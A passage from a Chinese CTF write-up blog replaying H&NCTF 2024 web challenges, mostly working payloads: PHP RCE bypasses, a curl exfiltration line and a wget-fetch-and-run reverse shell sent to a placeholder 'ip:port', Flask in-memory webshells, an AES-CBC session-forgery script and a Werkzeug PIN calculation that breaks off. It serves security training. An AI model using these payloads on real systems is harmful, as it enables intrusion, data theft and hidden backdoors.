class="line">把</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$engine</span>=<span class="keyword">array</span>(<span class="string">&quot;time&quot;</span>=&gt;<span class="string">&quot;10086&quot;</span>);</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;Loginout&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Debug</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">修改为</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$engine</span>=<span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&quot;data/files/shell&quot;</span>);</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;Loginout&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">即可</span><br></pre></td></tr></table></figure><p>最后反弹shell，</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21bf99dce.png" alt="屏幕截图 2024-04-06 175044.png"></p><p>成功反弹</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21c02f8c8.png" alt="image-20240406175218318.png"></p><p>参考：</p><p><a href="https://blog.csdn.net/2301_77392802/article/details/136980210?spm=1001.2014.3001.5501">https://blog.csdn.net/2301_77392802/article/details/136980210?spm=1001.2014.3001.5501</a></p><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18094228">https://www.cnblogs.com/EddieMurphy-blogs/p/18094228</a></p><p><a href="https://blog.csdn.net/ULGANOY/article/details/137013866">https://blog.csdn.net/ULGANOY/article/details/137013866</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247485228&idx=1&sn=b72c60e839d1d35ad9867e9c194f13e5&chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&mpshare=1&scene=23&srcid=0325X0enB84UIHcosRj3qfNJ&sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247485228&amp;idx=1&amp;sn=b72c60e839d1d35ad9867e9c194f13e5&amp;chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&amp;mpshare=1&amp;scene=23&amp;srcid=0325X0enB84UIHcosRj3qfNJ&amp;sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&amp;sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd</a></p><p><a href="https://blog.xmcve.com/2024/03/25/NKCTF-2024-Writeup/#title-5">https://blog.xmcve.com/2024/03/25/NKCTF-2024-Writeup/#title-5</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136980871">https://blog.csdn.net/uuzeray/article/details/136980871</a></p><p><a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQdK2K35D=Kt4D&alichlgref=https://www.google.com.hk/#toc-3">https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQdK2K35D%3DKt4D&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-3</a></p><p><a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a></p>]]></content>
      
      
      <categories>
          
          <category> CTFwp及复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp及复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;NCTF 2024 web复现</title>
      <link href="/2024/06/01/H-NCTF-2024-web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/06/01/H-NCTF-2024-web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="H-NCTF-2024-web复现"><a href="#H-NCTF-2024-web复现" class="headerlink" title="H&amp;NCTF 2024 web复现"></a>H&amp;NCTF 2024 web复现</h1><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>被打烂了，复现一下</p><h3 id="Please-RCE-Me（array-map函数、getallheaders函数、16进制转字符串读文件）"><a href="#Please-RCE-Me（array-map函数、getallheaders函数、16进制转字符串读文件）" class="headerlink" title="Please_RCE_Me（array_map函数、getallheaders函数、16进制转字符串读文件）"></a>Please_RCE_Me（array_map函数、getallheaders函数、16进制转字符串读文件）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>法一：由于第一个正则匹配没开启大小写匹配，第二个开启了，故可以用大小写绕过，rce可以用到array_map函数，官方文档<a href="https://www.php.net/manual/zh/function.array-map.php">array_map</a>，简单来说就是对array_map传入两个参数，第一个参数是调用的函数，第二个参数需要是一个数组，且默认调用数组的第一个元素为返回值传给第一个调用的函数并执行返回结果，payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：?<span class="attribute">moran</span>=flag&amp;a=system&amp;b[]=cat /f*</span><br><span class="line">POST：<span class="attribute">task</span>=array_map($_GET[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&amp;<span class="attribute">flag</span>=please_give_me_flaG</span><br></pre></td></tr></table></figure><p>法二：没有禁用数字，可以用16进制转字符串直接读&#x2F;flag文件，payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：?<span class="attribute">moran</span>=flag</span><br><span class="line">POST：<span class="attribute">flag</span>=please_give_me_flaG&amp;task=print(file_get_contents(&quot;\x2f\x66\x6c\x61\x67&quot;))</span><br></pre></td></tr></table></figure><p>法三：先用<code>var_dump(scandir(&quot;/&quot;))</code>打印出根目录下所有文件和文件夹，发现<code>/flag</code>目录，利用getallheaders()，将要读取的文件名写到HTTP头部字段，再读文件，payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /?moran=flag HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">a</span>:/flag</span><br><span class="line"><span class="attribute">Host</span>: hnctf.imxbt.cn:<span class="number">39102</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64; rv:<span class="number">125</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">125</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">68</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">task</span>=highlight_file((pos(getallheaders())))&amp;flag=please_give_me_flaG</span><br></pre></td></tr></table></figure><blockquote><p><code>getallheaders()</code> 也是 PHP 的内置函数，返回一个包含所有 HTTP 头信息的数组</p><p><code>pos()</code> 函数是 PHP 中的一个内置函数，返回数组中的当前元素</p><p><code>pos(getallheaders())</code>返回的数组中的第一个元素（也就是第一个 HTTP 头信息），然后尝试将其作为参数传递给 <code>highlight_file()</code>，且<code>highlight_file()</code>函数期望的是一个文件路径作为参数</p></blockquote><h3 id="ezFlask（curl外带、执行远程py脚本反弹shell、flask内存马）"><a href="#ezFlask（curl外带、执行远程py脚本反弹shell、flask内存马）" class="headerlink" title="ezFlask（curl外带、执行远程py脚本反弹shell、flask内存马）"></a>ezFlask（curl外带、执行远程py脚本反弹shell、flask内存马）</h3><p>可以直接curl外带</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cmd</span>=__import__(&quot;os&quot;).system(&quot;curl ip:port?<span class="attribute">a</span>=`cat /etc/jaygalf|ba<span class="string">&#x27;&#x27;</span>se64`<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure><p>还在网上看到一种方法，见文章：<a href="https://lisien11.github.io/2024/05/13/hnctf-wp/">https://lisien11.github.io/2024/05/13/hnctf-wp/</a></p><p>因为这道题目有python环境那么可以直接远程下载一个可以反弹shell的python脚本再执行就可以反弹shell了，</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>)<span class="selector-class">.popen</span>(<span class="string">&quot;wget ip:port/shell.py -O /tmp/shell.py;chmod 777 /tmp/shell.py;/tmp/shell.py&quot;</span>)<span class="selector-class">.read</span>()</span><br></pre></td></tr></table></figure><p>正常做法是注入内存马，payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">cmd=render_template_string(&quot;</span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\<span class="name">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><span class="language-xml">&quot;)</span></span><br></pre></td></tr></table></figure><p>再访问<code>/shell</code>路由，传入<code>grep -rl &quot;flag&#123;&quot; /etc</code>，这个命令是在 <code>/etc</code> 目录下递归查找含有文本 “flag{“ 的文件，并只列出含有匹配文本的文件路径</p><p><img src="https://img.picui.cn/free/2024/06/01/665b08bac3789.png" alt="image-20240521213201642.png"></p><p>访问该文件即可出flag，或以下内存马也行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#同时get传参cmd执行命令</span><br><span class="line">cmd=<span class="built_in">str</span>(app<span class="selector-class">.after_request_funcs</span><span class="selector-class">.setdefault</span>(None, <span class="selector-attr">[]</span>)<span class="selector-class">.append</span>(lambda resp: CmdResp <span class="keyword">if</span> request<span class="selector-class">.args</span><span class="selector-class">.get</span>(<span class="string">&#x27;cmd&#x27;</span>) and <span class="built_in">exec</span>(<span class="string">&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(os.popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;</span>)==None <span class="keyword">else</span> resp))</span><br><span class="line"></span><br><span class="line">#同时get传参cmd执行命令</span><br><span class="line">cmd=app<span class="selector-class">.before_request_funcs</span><span class="selector-class">.setdefault</span>(None, <span class="selector-attr">[]</span>)<span class="selector-class">.append</span>(lambda :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.popen</span>(request<span class="selector-class">.args</span><span class="selector-class">.get</span>(<span class="string">&#x27;cmd&#x27;</span>))<span class="selector-class">.read</span>())</span><br></pre></td></tr></table></figure><h3 id="flipPin（AES-CBC翻转攻击、pin码计算）"><a href="#flipPin（AES-CBC翻转攻击、pin码计算）" class="headerlink" title="flipPin（AES CBC翻转攻击、pin码计算）"></a>flipPin（AES CBC翻转攻击、pin码计算）</h3><p>参考题目：<a href="https://github.com/tamuctf/tamuctf-2024/tree/master/web/flipped">https://github.com/tamuctf/tamuctf-2024/tree/master/web/flipped</a></p><p>访问<code>/hint</code>路由拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>读完上面源码，大概思路就是在<code>/read</code>路由下伪造admin的session然后GET传参给<code>filename</code>读文件，但伪造session要用到AES CBC翻转攻击：<a href="https://blog.csdn.net/V1040375575/article/details/111773524%EF%BC%8C%E6%B2%A1%E7%9C%8B%E6%87%82%EF%BC%8C%E5%BC%95%E7%94%A8%E4%BD%AC%E7%9A%84%E8%84%9A%E6%9C%AC%E4%BA%86%EF%BC%9Ahttps://lisien11.github.io/2024/05/13/hnctf-wp/index.html">https://blog.csdn.net/V1040375575/article/details/111773524，没看懂，引用佬的脚本了：https://lisien11.github.io/2024/05/13/hnctf-wp/index.html</a></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="meta"># iv</span></span><br><span class="line"><span class="meta"># 第一组：&#123;&quot;admin&quot;: 0, &quot;us</span></span><br><span class="line"><span class="meta"># 第二组：ername&quot;: &quot;guest&quot;</span></span><br><span class="line"><span class="meta"># 第三组：&#125;</span></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(<span class="string">&quot;NvZVu1mOQAgjuCgIb1bfn1YQDnitktKno3573zjNvA4rIYYWg7XRQ5yAQoMz5PhVjTQfblgIu//ybtBUumRYjg==&quot;</span>)</span><br><span class="line">print(len(cipher))</span><br><span class="line"></span><br><span class="line">array_cipher = bytearray(cipher)</span><br><span class="line">iv = array_cipher[<span class="number">0</span>:<span class="type">16</span>]</span><br><span class="line">print(iv)</span><br><span class="line"></span><br><span class="line">decode_plain = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span>    <span class="meta">#把admin的值改为1即可</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#加密后的密文</span></span><br><span class="line">plain = <span class="string">&#x27;&#123;&quot;admin&quot;: 1, &quot;us&#x27;</span>   <span class="meta">#只需要修改admin的值所以这里只改变第一组的值即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span><span class="type">iv</span> = list(iv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):<span class="type"></span></span><br><span class="line">    <span class="keyword">new</span><span class="type">iv</span>[i] = (ord(plain[i].encode(<span class="string">&#x27;utf-8&#x27;</span>)) ^ iv[i] ^ ord(decode_plain[i].encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span><span class="type">iv</span> = bytes(<span class="keyword">new</span><span class="type">iv</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;newiv:&#x27;</span>, base64.b64encode(<span class="keyword">new</span><span class="type">iv</span> + cipher[<span class="number">16</span>:<span class="type"></span>]))</span><br></pre></td></tr></table></figure><p>最后就是计算pin值了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctfUser&#x27;</span>  <span class="comment"># /etc/passwd得到</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 路径报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892356&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&quot;9fd11036-6c2e-41c7-bb26-7d358f670070157ce012bcac9806b8c67a2fa6dcda9f2556c46d6b97fb841ac20117abe90a5e&quot;</span></span><br><span class="line"></span><br><span class="line">    <span 